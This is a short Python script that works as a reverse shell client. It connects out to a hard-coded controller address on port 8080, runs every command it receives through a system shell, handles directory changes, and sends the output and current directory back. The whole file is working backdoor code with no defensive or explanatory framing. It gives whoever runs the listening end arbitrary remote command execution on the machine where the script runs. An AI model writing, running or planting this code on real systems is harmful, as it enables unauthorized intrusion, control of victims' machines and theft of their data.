import socket
import os
import subprocess

sock = socket.socket()

host = '192.168.43.35'  # server's IP address
port = 8080  # port must be same for client and server

sock.connect((host, port))

while True:
    data = sock.recv(1024)

    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        command = subprocess.Popen(data.decode("utf-8"),
                                   shell=True,
                                   stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE,
                                   stderr=subprocess.PIPE
                                   )

        output_byte = command.stdout.read() + command.stderr.read()

        output_str = output_byte.decode('utf-8')
        cwd = os.getcwd() + '>'

        sock.send(str.encode(output_str + cwd))

        print(output_str)
